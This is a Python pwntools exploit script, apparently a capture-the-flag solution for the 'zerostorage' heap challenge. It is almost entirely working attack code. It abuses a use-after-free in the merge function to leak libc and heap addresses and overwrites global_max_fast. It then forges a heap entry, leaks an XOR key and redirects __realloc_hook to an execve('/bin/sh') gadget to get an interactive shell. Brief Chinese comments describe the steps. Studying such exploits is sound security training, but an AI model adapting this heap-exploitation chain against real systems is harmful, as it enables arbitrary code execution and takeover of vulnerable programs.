from pwn import *

p = process (  './zerostorage' )

realloc_hook_libc = 0x3a5608

excve_sh_libc = 0xd7117

global_m_fast_libc = 0x3a7860

unsorted_libc = 0x3a5678

pie_off = 0x5ce000

def insert( content ) :
    p.sendlineafter ( 'Your choice: ' , '1' )
    p.sendlineafter ( 'Length of new entry: ' , str ( len ( content ) ) )
    p.recvuntil ( 'Enter your data: ' )
    p.send ( content )

def update( id , content ) :
    p.sendlineafter ( 'Your choice: ' , '2' )
    p.sendlineafter ( 'Entry ID: ' , str ( id ) )
    p.sendlineafter ( 'Length of entry: ' , str ( len ( content ) ) )
    p.recvuntil ( 'Enter your data: ' )
    p.send ( content )

def merge( from_id , to_id ):
    p.sendlineafter ( 'Your choice: ' , '3' )
    p.sendlineafter ( 'Merge from Entry ID: ' , str ( from_id ) )
    p.sendlineafter ( 'Merge to Entry ID: ' , str ( to_id ) )

def delete( id ):
    p.sendlineafter ( 'Your choice: ' , '4' )
    p.sendlineafter ( 'Entry ID: ' , str ( id ) )

def view( id ):
    p.sendlineafter ( 'Your choice: ' , '5' )
    p.sendlineafter ( 'Entry ID: ' , str ( id ) )
    p.recvline()
    return p.recvline()[:-1]

def pwn ( ) :
    insert( 'a' * 8 ) #0
    insert( 'b' * 8 ) #1
    insert( 'c' * 8 ) #2
    insert( 'd' * 8 ) #3
    insert( 'e' * 8 ) #4
    insert( 'f' * 144 ) #5
    insert( 'g' * 8 ) #6
    delete(0)
    merge( 2 , 2 )

    libc_base = u64( view( 0 )[-8:] ) - unsorted_libc
    heap_base = u64( view( 0 )[:8] )
    realloc_hook = libc_base + realloc_hook_libc
    global_max_fast = libc_base + global_m_fast_libc
    excve_sh = libc_base + excve_sh_libc
    entry_head = libc_base + pie_off + 0x203060
    log.info('&global_max_fast='+hex(global_max_fast))
    log.info('&heap_base='+hex(heap_base))
    log.info('&entry_head='+hex(entry_head + 5 *24 ))

    insert( 'a' * 8 )
    update( 0, 'a'*8 + p64( global_max_fast - 0x10 ) )
    insert( 'b' * 8 )
    merge( 4 , 4 )
    update( 8 , p64( entry_head + 5*8*3 ) * 2 )
    insert( '1' * 8 )#这次分配还是在entry4的位置,下次就可以分配到伪造的entry_head上面去
    insert( 'x' * 120 )
    rand_key = u64 ( view( 9 ) [96:96+8] ) ^ ( entry_head + 5*8*3 )#泄漏出rand_key,
    print hex( rand_key )
    payload = 'a' * 8 + p64 ( 1 ) + p64( 8 ) + p64( ( realloc_hook + 0x30 ) ^ rand_key ) #计算出要改写的realloc_hook的偏移
    update ( 9 , payload )
    update ( 6 , p64( excve_sh ) )#把realloc_hook改成libc中执行system(/bin/sh)的地方

    p.sendlineafter ( 'Your choice: ' , '2' )
    p.sendlineafter ( 'Entry ID: ' , '0' )
    p.sendlineafter ( 'Length of entry: ' , '1314' )#触发realloc
    p.interactive()

if __name__ == '__main__' :
    pwn()
